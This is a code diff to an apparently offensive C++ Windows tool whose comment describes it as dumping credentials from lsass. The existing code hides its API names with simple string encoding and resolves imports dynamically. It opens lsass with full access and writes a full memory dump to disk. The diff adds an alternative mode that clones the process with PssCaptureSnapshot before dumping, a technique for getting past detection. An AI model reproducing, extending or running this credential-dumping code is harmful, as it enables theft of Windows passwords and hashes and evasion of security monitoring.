@@ -7,6 +7,7 @@
 #include <winnt.h>
 #include <winternl.h>
 #include <Lmcons.h>
+#include <processsnapshot.h>
 
 using namespace std;
 
@@ -25,7 +26,7 @@ char enc_func[4][20] = {
 void dec_r7(char* val) {
 	size_t i;
 	int base;
-	for (i=0; i < strlen(val); i++) {
+	for (i = 0; i < strlen(val); i++) {
 		if (val[i] <= 57) {
 			continue;	// numbers not processed
 		}
@@ -35,7 +36,7 @@ void dec_r7(char* val) {
 		else {
 			base = 97;
 		}
-		if (((int) val[i] - base - 7) < 0) {
+		if (((int)val[i] - base - 7) < 0) {
 			val[i] = (val[i] + 19);
 		}
 		else {
@@ -154,7 +155,7 @@ namespace dynamic {
 		dynamic::GPA = (GetProcAddressPrototype)find_dll_export(kernel32_base, enc_func[0]);
 		dynamic::GMH = (GetModuleHandlePrototype)find_dll_export(kernel32_base, enc_func[1]);
 
-		#define _import(_name, _type) ((_type) dynamic::GPA(dynamic::GMH("kernel32.dll"), _name))
+#define _import(_name, _type) ((_type) dynamic::GPA(dynamic::GMH("kernel32.dll"), _name))
 
 		dynamic::P32F = _import(enc_func[2], Process32FirstPrototype);
 		dynamic::P32N = _import(enc_func[3], Process32NextPrototype);
@@ -181,8 +182,24 @@ BOOL EnableTokenPrivilege(LPCTSTR lpszPrivilege) {
 	return bResult;
 }
 
+/* PssCaptureSnapshot */
+BOOL CALLBACK MyMiniDumpWriteDumpCallback(
+	__in     PVOID CallbackParam,
+	__in     const PMINIDUMP_CALLBACK_INPUT CallbackInput,
+	__inout  PMINIDUMP_CALLBACK_OUTPUT CallbackOutput
+)
+{
+	switch (CallbackInput->CallbackType)
+	{
+	case 16: // IsProcessSnapshotCallback
+		CallbackOutput->Status = S_FALSE;
+		break;
+	}
+	return TRUE;
+}
+
 /* dump of credentials from lsass */
-int main() {
+int main(int argc, char *argv[]) {
 	DWORD lsassPID = 0;
 	HANDLE lsassHandle = NULL;
 	HANDLE outFile = CreateFile(L"lsass.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
@@ -207,10 +224,36 @@ int main() {
 	}
 
 	lsassHandle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPID);
-	BOOL isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+
+	/* Pss or miniwritedump option*/
+	BOOL isDumped;
+
+	if (argc > 1 && std::string(argv[1]) == "PSS") { // build switch
+		cout << "[+] Using PSS cloning process approach." << endl;
+		HANDLE snapshotHandle = NULL;
+		DWORD flags = (DWORD)PSS_CAPTURE_VA_CLONE | PSS_CAPTURE_HANDLES | PSS_CAPTURE_HANDLE_NAME_INFORMATION | PSS_CAPTURE_HANDLE_BASIC_INFORMATION | PSS_CAPTURE_HANDLE_TYPE_SPECIFIC_INFORMATION | PSS_CAPTURE_HANDLE_TRACE | PSS_CAPTURE_THREADS | PSS_CAPTURE_THREAD_CONTEXT | PSS_CAPTURE_THREAD_CONTEXT_EXTENDED | PSS_CREATE_BREAKAWAY | PSS_CREATE_BREAKAWAY_OPTIONAL | PSS_CREATE_USE_VM_ALLOCATIONS | PSS_CREATE_RELEASE_SECTION;
+		MINIDUMP_CALLBACK_INFORMATION CallbackInfo;
+		ZeroMemory(&CallbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+		CallbackInfo.CallbackRoutine = &MyMiniDumpWriteDumpCallback;
+		CallbackInfo.CallbackParam = NULL;
+
+		PssCaptureSnapshot(lsassHandle, (PSS_CAPTURE_FLAGS)flags, CONTEXT_ALL, (HPSS*)&snapshotHandle);
+		isDumped = MiniDumpWriteDump(snapshotHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, &CallbackInfo);
+
+		PssFreeSnapshot(GetCurrentProcess(), (HPSS)snapshotHandle);
+	}
+	else {
+		cout << "[+] Using default lsass dump approach, for PSS clone pass 'PSS' as cli argument" << endl;
+		isDumped = MiniDumpWriteDump(lsassHandle, lsassPID, outFile, MiniDumpWithFullMemory, NULL, NULL, NULL);
+	}
+
+	
 
 	if (isDumped) {
 		cout << "[+] lsass dumped successfully!" << endl;
+	}
+	else {
+		cout << "[e]Nothing has been dumped." << endl;
 	}
 
 	return 0;
